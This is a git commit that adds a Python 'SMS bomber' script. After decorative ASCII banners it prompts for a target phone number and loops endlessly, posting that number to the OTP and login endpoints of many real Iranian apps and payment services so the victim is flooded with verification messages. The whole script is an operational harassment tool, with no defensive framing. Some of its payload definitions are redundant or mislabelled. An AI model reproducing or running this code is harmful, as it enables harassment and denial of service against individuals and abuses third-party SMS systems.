f9fd4f1ed3bbd864262336b581dd870e27a59982
aryan-megatrn <111707745+aryan-megatrn@users.noreply.github.com>
2022-09-15 03:29:18 +0430

    Create sms-megatrn.py

---
+++ sms-megatrn.py
@@ -0,0 +1,231 @@
+from colorama import Fore
+from requests import post , get
+from time import sleep
+import time
+import os
+import sys
+
+
+os.system("clear")
+
+print (Fore.BLUE)
+print ("\n[Mi]\n")
+sleep(0.5)
+print ("[MR]\n")
+sleep(0.5)
+print ("[ARYAN]\n")
+sleep(0.5)
+print ("[MEGATRN]\n")
+sleep(0.5)
+print ("[My love Atnam️]\n")
+
+print (Fore.GREEN)
+
+kop = """ 
+
+
+             \|/
+            .-*-         
+           / /|\         
+          _L_            
+        ,"   ".          
+    (\ /  O O  \ /)      
+     \|    _    |/       
+       \  (_)  /         
+       _/.___,\_         
+      (_/      \_)         
+ 
+ \033[33m t.me/aryan_megatrn    
+  \033[33m github.com/aryan-megatrn   
+"""
+for c in kop:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.06)
+
+
+
+print (Fore.RED+"""
+________________________________$__________________
+_______________________$$$$____$$$_________________
+______________$$$$$$$$$$$$$$$$$$$_$$_______________
+_____________$$$$$$____$$$$$$$$$$_$$_______________
+_____________$$$$$$___$$$$$$$$$$$$$$_______________
+_____________$$$$$$_$$$$$$$$$$$$$$$$_______________
+_____________$$$$$$$$_$$$$$$$$$$$$_$_______________
+______________$$$$$__$$$$$$$$$$$$$$________________
+______________$$$$$_$$$$$$$$$$$$$$$________________
+______________$$$$$$$$$$$$$$$_$$$$$________________
+______________$$$$$$$$$$$$$$$__$$$$$$______________
+____________$$$$$$$$$$$$$$$$$$$__$$$$$$____________
+___________$$$$$$$$$$$$$$$$$$$$$__$$$$$$___________
+__________$$$$$$$$$$$$$$$$$$$$$$$__$$$$$$__________
+_________$$$$$$$$$$$$$$$$$$$$$$$$___$$$$$__________
+________$$$$$$$$$$$$$$$$$$$$$$$$$$___$$$$$_________
+_______$$$$$$$$$$$$$$$$$$$$$$$$$$$$___$$$$$________
+_______$$$$$$$$$$$$$$$$$$$$$$$$$$$$____$$$$________
+_______$$$$$$$$$$$$$$$$$$$$$$$$$$$$_____$$$$_______
+______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$____$$$$_______
+______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_____$$$_______
+______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_____$$$$______
+______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_____$$$$______
+_______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$______$$$______
+_______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$______$$$______
+_______$$$$$$$$$$$$$$$$$$$$$$$$$$$$_______$$$______
+________$$$$$$$$$$$$$$$$$$$$$$$$$$$_______$$_______
+_________$$$$$$$$$$$$$$$$$$$$$$$$$_______$$$_______
+_________$$$$$$$$$$$$$$$$$$$$$$$$________$$________
+__________$$$$$$$$$$$$$$$$$$$$$$$________$$________
+___________$$$$$$$$$$$$$$$$$$$$$________$$_________
+____________$$$$$$$$$$$$$$$$$$$____________________
+_____________$$$$$$$$$$$$$$$$$_____________________
+   """)
+                           
+           
+  
+
+print (Fore.CYAN+"𝑆𝑀𝑆 𝐵𝑂𝑀𝐵𝐸𝑅")
+
+
+print(Fore.GREEN+""" 
+
+╔═══╦═╗╔═╦═══╗╔══╗╔═══╦═╗╔═╦══╗╔═══╦═══╗
+║╔═╗║║╚╝║║╔═╗║║╔╗║║╔═╗║║╚╝║║╔╗║║╔══╣╔═╗║
+║╚══╣╔╗╔╗║╚══╗║╚╝╚╣║─║║╔╗╔╗║╚╝╚╣╚══╣╚═╝║
+╚══╗║║║║║╠══╗║║╔═╗║║─║║║║║║║╔═╗║╔══╣╔╗╔╝
+║╚═╝║║║║║║╚═╝║║╚═╝║╚═╝║║║║║║╚═╝║╚══╣║║╚╗
+╚═══╩╝╚╝╚╩═══╝╚═══╩═══╩╝╚╝╚╩═══╩═══╩╝╚═╝ 
+""")
+
+print (Fore.RED)
+number = input ("Phone number target => ")
+sleep(1)
+print (Fore.RED+"\nattack bomber ",number)
+sleep(0.7)
+print (Fore.RED+"\tstart\n")
+sleep(2)
+
+api0 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
+api1 = {"cellphone":number}
+api2 = {"api_version":number}
+api3 = {"api_version":number}
+api4 = {"events":number}
+api5 = {"cellNumber":number}
+api6 = "cellNumber="+number
+api7 = {"phone":number}
+api8 = {"phoneNumber":number}
+api9 = "send=1&cellphone="+number
+api10 = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}
+api11 = {"status":number}
+api12 = {"r_value":0.04675983630952381,"is_vpv":number}
+api13 = {"username":number}
+api14 = {"tagId":number}
+api2 = {"api_version":number}
+api= {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+api2 = {"api_version":number}
+
+#################loading##############
+while True:
+    hamid0 = post("https://api.tapsi.cab/api/v2/user", json=api0)
+    if hamid0.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=api1)
+
+    if hamid.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid1 = post("https://messengerg2c70.iranlms.ir/", json=api2)
+    
+    if hamid1.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid2 = post("https://shadmessenger60.iranlms.ir/", json=api3)
+    
+    if hamid2.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid3 = post("https://analytics.metrix.ir/v3/engagement_event", json=api4)
+    
+    if hamid3.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid4 = post("https://app.mydigipay.com/digipay/api/users/send-sms", json=api5)
+    
+    if hamid4.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid5 = post("https://bama.ir/signin-checkforcellnumber",data=api6)
+    
+    if hamid5.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid6 = post("https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/", json=api7)
+     
+    if hamid6.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+      
+    hamid7 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=api8)
+      
+    if hamid7.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+         print (Fore.RED+"[-]ERROR")
+          
+    hamid8 = post("https://web.emtiyaz.app/json/login",data=api9)
+      
+    if hamid8.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid9 = post("https://api.chartex.net/api/v2/user/validate", json=api10)
+    if hamid9.status_code == 200:
+         print (Fore.GREEN+"[*]attack ", number)
+    else:
+         print (Fore.RED+"[-]ERROR")
+    hamid10 = post("https://api.zarinplus.com/user/zarinpal-login", json=api11)
+    
+    if hamid10.status_code == 200:
+        print (Fore.GREEN+"[*]attack ", number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid11 = post("https://in.hotjar.com/api/v2/client/sites/2501013/visit-data?sv=7",json=api12)
+    if hamid11.status_code == 200:
+         print (Fore.GREEN+"[*]attack ",number)
+    else:
+         print (Fore.RED+"[-]ERROR")
+         
+    hamid12 = post("https://next.zarinpal.com/api/oauth/initialize", json=api13)
+    if hamid12.status_code == 200:
+        print (Fore.GREEN+"[*]attack ",number)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid13 = post("https://api.mediaad.org/v1/events/tag?fid=7ec75c0a-4b31-4354-bc43-4f92ab49cedc", json=api14)
+    if hamid13.status_code == 200:
+         print (Fore.GREEN+"[*]attack ", number)
+    else:
+         print (Fore.RED+"[-]ERROR")
+
+         
+     
+     
+     
